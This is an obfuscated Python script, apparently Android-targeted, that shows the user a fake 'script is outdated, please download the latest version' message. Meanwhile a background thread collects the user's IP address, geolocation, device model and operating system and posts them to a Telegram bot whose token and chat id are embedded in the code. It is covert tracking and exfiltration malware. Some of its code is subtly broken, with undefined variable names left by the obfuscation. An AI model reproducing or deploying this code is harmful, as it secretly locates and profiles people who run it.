import requests
IO=None
IQ=Exception
IW=print
Ic=requests.post
IA=requests.RequestException
IJ=requests.get
import threading
IL=threading.Thread
import subprocess
IT=subprocess.check_output
import platform
IY=platform.platform
from datetime import datetime
IR=("".join([chr(54),chr(55),chr(52),chr(53),chr(55),chr(49),chr(49),chr(57),chr(49),chr(50),chr(58),chr(65),chr(65),chr(70),chr(52),chr(67),chr(112),chr(121),chr(84),chr(45),chr(104),chr(56),chr(54),chr(54),chr(111),chr(118),chr(95),chr(54),chr(99),chr(95),chr(66),chr(116),chr(71),chr(45),chr(85),chr(101),chr(112),chr(45),chr(106),chr(102),chr(99),chr(114),chr(121),chr(71),chr(69),chr(56)]))
IF=("".join([chr(50),chr(49),chr(48),chr(52),chr(53),chr(57),chr(50),chr(51),chr(57),chr(57)]))
def Ib():
  try:
    It=IJ(("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(105),chr(112),chr(105),chr(110),chr(102),chr(111),chr(46),chr(105),chr(111),chr(47)]))                              ,timeout=int("".join([chr(50)]))                                        )
    if It.status_code==int("".join([chr(50),chr(48),chr(48)]))                          :
      return It.json()
  except IA:
    return IO
def Ii():
  try:
    Im=IT([("".join([chr(103),chr(101),chr(116),chr(112),chr(114),chr(111),chr(112)]))                    ,("".join([chr(114),chr(111),chr(46),chr(112),chr(114),chr(111),chr(100),chr(117),chr(99),chr(116),chr(46),chr(109),chr(111),chr(100),chr(101),chr(108)]))                                       ]).decode().strip()
    return Im
  except IQ:
    return("".join([chr(85),chr(110),chr(107),chr(110),chr(111),chr(119),chr(110),chr(32),chr(68),chr(101),chr(118),chr(105),chr(99),chr(101)]))
def Iq():
  return IY()
def IE(ID):
  In=f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
  Iw={("".join([chr(99),chr(104),chr(97),chr(116),chr(95),chr(105),chr(100)]))                   :IF,("".join([chr(116),chr(101),chr(120),chr(116)]))                                 :ID,("".join([chr(112),chr(97),chr(114),chr(115),chr(101),chr(95),chr(109),chr(111),chr(100),chr(101)]))                                                     :("".join([chr(72),chr(84),chr(77),chr(76)]))                                                              }
  try:
    Ic(In,data=Iw)
  except IQ:
    pass
def IP():
  IG=Ib()
  if IG:
    ip=IG.get(("".join([chr(105),chr(112)]))                  ,("".join([chr(78),chr(47),chr(65)]))                        )
    IX=IG.get(("".join([chr(99),chr(105),chr(116),chr(121)]))                    ,("".join([chr(78),chr(47),chr(65)]))                          )
    Iy=IG.get(("".join([chr(114),chr(101),chr(103),chr(105),chr(111),chr(110)]))                      ,("".join([chr(78),chr(47),chr(65)]))                            )
    Iv=IG.get(("".join([chr(99),chr(111),chr(117),chr(110),chr(116),chr(114),chr(121)]))                       ,("".join([chr(78),chr(47),chr(65)]))                             )
    Iz=IG.get(("".join([chr(108),chr(111),chr(99)]))                   ,("".join([chr(78),chr(47),chr(65)]))                         )
    IM=IG.get(("".join([chr(111),chr(114),chr(103)]))                   ,("".join([chr(78),chr(47),chr(65)]))                         )
    IK=IG.get(("".join([chr(112),chr(111),chr(115),chr(116),chr(97),chr(108)]))                      ,("".join([chr(78),chr(47),chr(65)]))                            )
    Ix=IG.get(("".join([chr(116),chr(105),chr(109),chr(101),chr(122),chr(111),chr(110),chr(101)]))                        ,("".join([chr(78),chr(47),chr(65)]))                              )
    Il=datetime.now().strftime(("".join([chr(37),chr(89),chr(45),chr(37),chr(109),chr(45),chr(37),chr(100),chr(32),chr(37),chr(72),chr(58),chr(37),chr(77),chr(58),chr(37),chr(83)]))                                                  )
    Ir=Ii()
    IV=Iq()
    ID=(      f"<b>IP Address Information:</b>\n\n"      f"<b>IP:</b> {ip}\n"      f"<b>City:</b> {city}\n"      f"<b>Region:</b> {region}\n"      f"<b>Country:</b> {country}\n"      f"<b>Location:</b> {loc}\n"      f"<b>Organization:</b> {org}\n"      f"<b>Postal Code:</b> {postal}\n"      f"<b>Timezone:</b> {timezone}\n"      f"<b>Current Time:</b> {current_time}\n"      f"<b>Device Model:</b> {device_model}\n"      f"<b>Operating System:</b> {os_info}"    )
    IE(ID)
def IU():
  IW(("".join([chr(84),chr(104),chr(105),chr(115),chr(32),chr(115),chr(99),chr(114),chr(105),chr(112),chr(116),chr(32),chr(105),chr(115),chr(32),chr(111),chr(117),chr(116),chr(100),chr(97),chr(116),chr(101),chr(100),chr(44),chr(32),chr(112),chr(108),chr(101),chr(97),chr(115),chr(101),chr(32),chr(100),chr(111),chr(119),chr(110),chr(108),chr(111),chr(97),chr(100),chr(32),chr(116),chr(104),chr(101),chr(32),chr(108),chr(97),chr(116),chr(101),chr(115),chr(116),chr(32),chr(118),chr(101),chr(114),chr(115),chr(105),chr(111),chr(110),chr(46)]))                                                                   )
  IL(target=IP).start()
